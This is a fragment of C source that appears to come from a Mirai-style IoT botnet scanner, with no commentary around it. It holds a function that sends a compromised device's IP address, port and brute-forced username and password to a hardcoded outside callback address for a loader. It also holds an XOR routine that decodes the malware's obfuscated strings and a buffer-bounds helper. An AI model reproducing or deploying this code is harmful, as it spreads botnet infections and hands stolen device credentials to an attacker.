static void report_working(ipv4_t daddr, uint16_t dport, struct scanner_auth *auth)
{
    struct sockaddr_in addr;
    int pid = fork(), fd;

    if (pid > 0 || pid == -1)
        return;

    if ((fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
    {
#ifdef DEBUG
        printf("[report] Failed to call socket()\n");
#endif
        exit(0);
    }
    
    table_unlock_val(TABLE_SCAN_CB_PORT);
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INET_ADDR(185,189,58,211);
    addr.sin_port = *((port_t *)table_retrieve_val(TABLE_SCAN_CB_PORT, NULL));
    table_lock_val(TABLE_SCAN_CB_PORT);

    if (connect(fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in)) == -1)
    {
#ifdef DEBUG
        printf("[report] Failed to connect to scanner callback!\n");
#endif
        close(fd);
        exit(0);
    }

    uint8_t zero = 0;
    send(fd, &zero, sizeof (uint8_t), MSG_NOSIGNAL);
    send(fd, &daddr, sizeof (ipv4_t), MSG_NOSIGNAL);
    send(fd, &dport, sizeof (uint16_t), MSG_NOSIGNAL);
    send(fd, &(auth->username_len), sizeof (uint8_t), MSG_NOSIGNAL);
    send(fd, auth->username, auth->username_len, MSG_NOSIGNAL);
    send(fd, &(auth->password_len), sizeof (uint8_t), MSG_NOSIGNAL);
    send(fd, auth->password, auth->password_len, MSG_NOSIGNAL);

#ifdef DEBUG
    printf("[report] Send scan result to loader\n");
#endif

    close(fd);
    exit(0);
}

static char *deobf(char *str, int *len)
{
    int i;
    char *cpy;

    *len = util_strlen(str);
    cpy = malloc(*len + 1);

    util_memcpy(cpy, str, *len + 1);

    for (i = 0; i < *len; i++)
    {
        cpy[i] ^= 0x13;
        cpy[i] ^= 0x37;
        cpy[i] ^= 0xC0;
        cpy[i] ^= 0xD3;
    }

    return cpy;
}

static BOOL can_consume(struct scanner_connection *conn, uint8_t *ptr, int amount)
{
    uint8_t *end = conn->rdbuf + conn->rdbuf_pos;

    return ptr + amount < end;
}

#endif
